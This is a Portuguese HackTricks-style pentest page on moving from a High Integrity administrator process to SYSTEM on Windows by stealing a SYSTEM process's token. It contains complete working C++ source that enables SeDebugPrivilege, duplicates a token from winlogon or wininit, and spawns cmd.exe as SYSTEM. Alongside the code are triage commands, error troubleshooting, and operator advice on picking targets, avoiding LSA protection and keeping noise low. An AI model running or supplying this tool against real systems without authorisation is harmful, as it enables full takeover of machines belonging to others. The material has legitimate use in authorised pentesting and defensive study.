# SeImpersonate de High para SYSTEM

{{#include ../../banners/hacktricks-training.md}}

Esta página aborda a versão **manual** de passar de um **processo de administrador com High Integrity** para **`NT AUTHORITY\SYSTEM`**, **abrindo um processo SYSTEM não protegido, duplicando o token e iniciando um processo filho com esse token**.

Se você tiver apenas **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**, mas **não puder abrir um processo SYSTEM adequado**, o caminho de **Potato / named-pipe** geralmente é mais confiável:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Se o que você deseja não é apenas `SYSTEM`, mas um **token SYSTEM com o maior número possível de privilégios**, consulte também:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Triagem rápida

Antes de tentar roubar um token, valide rapidamente o contexto:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Notas práticas:

- Um token de administrador **High Integrity** geralmente é suficiente para **habilitar `SeDebugPrivilege`** e abrir muitos processos SYSTEM não protegidos.
- **`CreateProcessWithTokenW` exige `SeImpersonatePrivilege`** no caller. Se essa API falhar com `1314`, alterne para `CreateProcessAsUserW` depois de já ter duplicado um token primário SYSTEM.
- No Windows moderno, **`lsass.exe` geralmente é um alvo ruim** porque a **proteção LSA / PPL** bloqueia o acesso mesmo para administradores com `SeDebugPrivilege`. Prefira **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** ou um **`svchost.exe`** inicial executando como SYSTEM.
- Nem todo processo SYSTEM possui um token igualmente útil. Se você obtiver SYSTEM, mas perceber que faltam privilégios, tente outro processo SYSTEM em vez de presumir que a técnica está quebrada.

## Escolha o PID com cuidado

A maneira mais fácil de fazer isso funcionar de forma confiável é **escolher um processo SYSTEM cuja DACL realmente permita que Administrators consultem o processo e dupliquem seu token**.

Bons candidatos para testar primeiro:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- algumas instâncias iniciais de `svchost.exe` executando como SYSTEM

Evite por padrão:

- `lsass.exe` em hosts onde **RunAsPPL / LSA protection** está habilitado
- processos protegidos ou sensíveis à segurança que retornam `Access denied` mesmo após habilitar `SeDebugPrivilege`

Você pode inspecionar os processos candidatos e suas ACLs/tokens usando o **Process Explorer** ou o **Process Hacker** executado com privilégios elevados.

### Código

O código a seguir vem [daqui](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Ele permite **indicar um Process ID como argumento**, e um CMD **executando como o usuário** do processo indicado será iniciado.\
Executando em um processo High Integrity, você pode **indicar o PID de um processo executando como System** (como `winlogon` ou `wininit`) e executar um `cmd.exe` como SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Observações úteis sobre API / direitos de acesso

O exemplo usa `MAXIMUM_ALLOWED`, mas, para operações reais, é útil lembrar os requisitos mínimos envolvidos:

- `OpenProcessToken()` requer apenas que o **handle do processo** tenha sido aberto com **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Para usar `CreateProcessWithTokenW()`, o handle do **primary token** deve ter **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` deve criar um **primary token** (`TokenPrimary`), e não apenas um token de impersonation.
- Se você já fez impersonation de SYSTEM e `CreateProcessWithTokenW()` ainda falhar com `1314`, tente usar `CreateProcessAsUserW()`.

Isso significa que abrir o processo-alvo com `PROCESS_ALL_ACCESS` geralmente é desnecessário e gera mais ruído do que simplesmente solicitar os direitos necessários para consultar o token.

## Erro

Em algumas ocasiões, você pode tentar fazer impersonation de System e isso não funcionar, exibindo uma saída como a seguinte:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Isso significa que, mesmo que você esteja executando em um nível **High Integrity**, **você não tem permissões suficientes** sobre esse processo/token de destino.\
Vamos verificar as permissões atuais de Administrator sobre os processos `svchost.exe` com o **Process Explorer** (ou você também pode usar o **Process Hacker**):

1. Selecione um processo `svchost.exe`
2. Clique com o botão direito --> Propriedades
3. Na aba "Security", clique no botão "Permissions" no canto inferior direito
4. Clique em "Advanced"
5. Selecione "Administrators" e clique em "Edit"
6. Clique em "Show advanced permissions"

![Code - Error: 6. Clique em "Show advanced permissions"](<../../images/image (437).png>)

A imagem anterior contém todos os privilégios que "Administrators" têm sobre o processo selecionado (como você pode ver, no caso de `svchost.exe`, eles têm apenas privilégios de "Query")

Veja os privilégios que "Administrators" têm sobre `winlogon.exe`:

![Code - Error: Veja os privilégios que "Administrators" têm sobre winlogon.exe](<../../images/image (1102).png>)

Nesse processo, "Administrators" podem "Read Memory" e "Read Permissions", o que provavelmente permite que Administrators impersonem o token usado por esse processo.

### Causas comuns de falha

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: a DACL do processo bloqueia seu acesso ou o destino está **protected/PPL**. Escolha outro processo SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: seu token handle foi aberto sem direitos suficientes ou a DACL do token de destino impede a duplicação.
- **`CreateProcessWithTokenW()` -> `1314`**: o caller não tem atualmente **`SeImpersonatePrivilege`** habilitado. Tente habilitá-lo primeiro ou use `CreateProcessAsUserW()` com o primary token duplicado.
- **`CreateProcessWithTokenW()` -> `1326`** após falhas anteriores: isso geralmente significa apenas que a etapa anterior de duplicação/impersonation do token falhou, portanto não há um primary token utilizável para iniciar o processo filho.

## Notas do operador

- Essa técnica é excelente quando você já é **local admin + high integrity** e quer apenas um caminho rápido e manual para obter SYSTEM, sem iniciar um service ou criar uma cadeia de coerção com named pipe.
- Em ambientes Windows 11 / Server hardened, a **LSA protection está se tornando cada vez mais comum**, portanto um workflow que assume que `lsass.exe` sempre pode ser lido é frágil. **`winlogon.exe` / `wininit.exe` / `services.exe` geralmente são escolhas iniciais melhores**.<sup>[[2]](#references)</sup>
- Se você obtiver um contexto de **service account** em vez de um desktop de admin elevado, a **Potato family** geralmente é mais adequada do que esta página.



## Referências

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Understanding and Abusing Process Tokens — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
